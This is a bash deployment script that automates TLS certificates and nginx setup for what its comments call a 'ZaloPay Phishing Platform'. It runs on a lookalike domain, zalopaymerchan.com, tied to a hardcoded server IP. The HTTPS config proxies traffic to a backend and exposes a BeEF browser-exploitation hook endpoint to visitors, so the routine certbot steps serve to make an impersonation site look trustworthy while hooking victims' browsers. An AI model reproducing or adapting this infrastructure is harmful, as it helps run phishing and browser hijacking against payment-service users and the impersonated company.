#!/bin/bash

# SSL Setup Script for ZaloPay Phishing Platform
# Automated Let's Encrypt certificate management

set -e

# Configuration
DOMAIN="zalopaymerchan.com"
EMAIL="admin@zalopaymerchan.com"
NGINX_CONF="/etc/nginx/nginx.conf"
CERTBOT_DIR="/etc/letsencrypt"
WEBROOT_DIR="/var/www/certbot"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root"
        exit 1
    fi
}

# Check DNS resolution
check_dns() {
    log "Checking DNS resolution for $DOMAIN..."
    
    if nslookup $DOMAIN > /dev/null 2>&1; then
        IP=$(nslookup $DOMAIN | grep -A1 "Name:" | tail -1 | awk '{print $2}')
        log "Domain $DOMAIN resolves to $IP"
        
        # Check if IP matches expected server IP
        if [[ "$IP" == "221.120.163.129" ]]; then
            success "DNS is correctly configured"
        else
            warning "DNS points to $IP, expected 221.120.163.129"
        fi
    else
        error "DNS resolution failed for $DOMAIN"
        exit 1
    fi
}

# Check port accessibility
check_ports() {
    log "Checking port accessibility..."
    
    # Check if ports 80 and 443 are accessible
    if netstat -tlnp | grep -q ":80 "; then
        success "Port 80 is accessible"
    else
        error "Port 80 is not accessible"
        exit 1
    fi
    
    if netstat -tlnp | grep -q ":443 "; then
        success "Port 443 is accessible"
    else
        warning "Port 443 is not accessible (will be configured)"
    fi
}

# Install required packages
install_packages() {
    log "Installing required packages..."
    
    # Update package list
    apt-get update
    
    # Install certbot and nginx
    apt-get install -y certbot python3-certbot-nginx nginx
    
    success "Packages installed successfully"
}

# Create webroot directory
create_webroot() {
    log "Creating webroot directory..."
    
    mkdir -p $WEBROOT_DIR
    chown -R www-data:www-data $WEBROOT_DIR
    chmod -R 755 $WEBROOT_DIR
    
    success "Webroot directory created"
}

# Configure nginx for ACME challenge
configure_nginx_acme() {
    log "Configuring nginx for ACME challenge..."
    
    cat > /etc/nginx/sites-available/acme-challenge << EOF
server {
    listen 80;
    server_name $DOMAIN www.$DOMAIN;
    
    location /.well-known/acme-challenge/ {
        root $WEBROOT_DIR;
        try_files \$uri =404;
    }
    
    location / {
        return 301 https://\$server_name\$request_uri;
    }
}
EOF
    
    # Enable the site
    ln -sf /etc/nginx/sites-available/acme-challenge /etc/nginx/sites-enabled/
    
    # Remove default site
    rm -f /etc/nginx/sites-enabled/default
    
    # Test nginx configuration
    nginx -t
    
    # Reload nginx
    systemctl reload nginx
    
    success "Nginx configured for ACME challenge"
}

# Request SSL certificate
request_certificate() {
    log "Requesting SSL certificate from Let's Encrypt..."
    
    # Stop nginx temporarily
    systemctl stop nginx
    
    # Request certificate
    certbot certonly \
        --webroot \
        --webroot-path=$WEBROOT_DIR \
        --email $EMAIL \
        --agree-tos \
        --no-eff-email \
        --domains $DOMAIN,www.$DOMAIN \
        --non-interactive
    
    if [[ $? -eq 0 ]]; then
        success "SSL certificate obtained successfully"
    else
        error "Failed to obtain SSL certificate"
        exit 1
    fi
}

# Configure nginx for HTTPS
configure_nginx_https() {
    log "Configuring nginx for HTTPS..."
    
    cat > /etc/nginx/sites-available/zalopaymerchan.com << EOF
# HTTP to HTTPS redirect
server {
    listen 80;
    server_name $DOMAIN www.$DOMAIN;
    
    location /.well-known/acme-challenge/ {
        root $WEBROOT_DIR;
        try_files \$uri =404;
    }
    
    location / {
        return 301 https://\$server_name\$request_uri;
    }
}

# HTTPS server
server {
    listen 443 ssl http2;
    server_name $DOMAIN www.$DOMAIN;
    
    # SSL configuration
    ssl_certificate $CERTBOT_DIR/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key $CERTBOT_DIR/live/$DOMAIN/privkey.pem;
    
    # SSL settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Proxy to backend
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header X-Forwarded-Host \$host;
        proxy_set_header X-Forwarded-Port \$server_port;
        
        # WebSocket support
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    # Static files
    location /static/ {
        alias /opt/zalopay/frontend/static/;
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
    
    # BeEF hook endpoint
    location /hook.js {
        proxy_pass http://127.0.0.1:3000/hook.js;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
    
    # Enable the site
    ln -sf /etc/nginx/sites-available/zalopaymerchan.com /etc/nginx/sites-enabled/
    
    # Remove ACME challenge site
    rm -f /etc/nginx/sites-enabled/acme-challenge
    
    # Test nginx configuration
    nginx -t
    
    success "Nginx configured for HTTPS"
}

# Setup certificate auto-renewal
setup_auto_renewal() {
    log "Setting up certificate auto-renewal..."
    
    # Create renewal script
    cat > /etc/cron.d/certbot-renewal << EOF
# Renew Let's Encrypt certificates twice daily
0 12 * * * root certbot renew --quiet --post-hook "systemctl reload nginx"
0 0 * * * root certbot renew --quiet --post-hook "systemctl reload nginx"
EOF
    
    # Test renewal
    certbot renew --dry-run
    
    success "Certificate auto-renewal configured"
}

# Start services
start_services() {
    log "Starting services..."
    
    # Start nginx
    systemctl start nginx
    systemctl enable nginx
    
    # Check nginx status
    if systemctl is-active --quiet nginx; then
        success "Nginx is running"
    else
        error "Failed to start nginx"
        exit 1
    fi
}

# Test SSL configuration
test_ssl() {
    log "Testing SSL configuration..."
    
    # Test HTTPS connection
    if curl -s -I https://$DOMAIN | grep -q "200 OK"; then
        success "HTTPS is working correctly"
    else
        warning "HTTPS test failed, but certificate is installed"
    fi
    
    # Test certificate validity
    if openssl s_client -connect $DOMAIN:443 -servername $DOMAIN < /dev/null 2>/dev/null | openssl x509 -noout -dates | grep -q "notAfter"; then
        success "SSL certificate is valid"
    else
        error "SSL certificate validation failed"
        exit 1
    fi
}

# Display summary
display_summary() {
    log "SSL Setup Complete!"
    echo
    echo "=========================================="
    echo "SSL Configuration Summary"
    echo "=========================================="
    echo "Domain: $DOMAIN"
    echo "Certificate: $CERTBOT_DIR/live/$DOMAIN/"
    echo "Nginx Config: /etc/nginx/sites-available/zalopaymerchan.com"
    echo "Webroot: $WEBROOT_DIR"
    echo "Auto-renewal: Enabled (twice daily)"
    echo
    echo "Test your SSL configuration:"
    echo "curl -I https://$DOMAIN"
    echo
    echo "Check certificate expiration:"
    echo "openssl s_client -connect $DOMAIN:443 -servername $DOMAIN < /dev/null 2>/dev/null | openssl x509 -noout -dates"
    echo
    echo "Manual certificate renewal:"
    echo "certbot renew"
    echo
}

# Main execution
main() {
    log "Starting SSL setup for ZaloPay Phishing Platform..."
    
    check_root
    check_dns
    check_ports
    install_packages
    create_webroot
    configure_nginx_acme
    request_certificate
    configure_nginx_https
    setup_auto_renewal
    start_services
    test_ssl
    display_summary
    
    success "SSL setup completed successfully!"
}

# Run main function
main "$@"
